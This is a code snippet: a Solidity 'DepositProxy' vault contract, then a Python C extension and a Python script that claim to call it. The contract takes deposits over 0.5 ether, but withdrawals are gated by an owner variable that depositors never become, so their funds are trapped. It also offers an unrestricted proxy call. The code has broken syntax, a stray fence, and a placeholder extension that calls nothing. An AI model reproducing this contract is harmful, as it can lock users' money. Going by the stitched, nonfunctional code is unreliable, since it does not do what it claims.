pragma solidity ^0.4.24;

contract Proxy {
    modifier __; modifier onlyOwner { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { Owner = _owner; } 
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    address public O;
    mapping (address => uint256) public D;

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            O = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            D[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if (amount>0 && D[msg.sender]>=amount) {
            msg.sender.transfer(amount);
        }
    }
}
```

```c
#include <Python.h>

static PyObject* call_proxy(PyObject* self, PyObject* args) {
    const char* target;
    const char* data;
    if (!PyArg_ParseTuple(args, "ss", &target, &data)) {
        return NULL;
    }
    // Placeholder for interaction with smart contract
    return Py_BuildValue("s", "Function called");
}

static PyMethodDef ProxyMethods[] = {
    {"call_proxy", call_proxy, METH_VARARGS, "Call proxy function with target and data."},
    {NULL, NULL, 0, NULL}
};

PyMODINIT_FUNC initproxy(void) {
    (void) Py_InitModule("proxy", ProxyMethods);
}
```

```python
import proxy

def call_smart_contract():
    result = proxy.call_proxy("target_address", "data_payload")
    print(result)

call_smart_contract()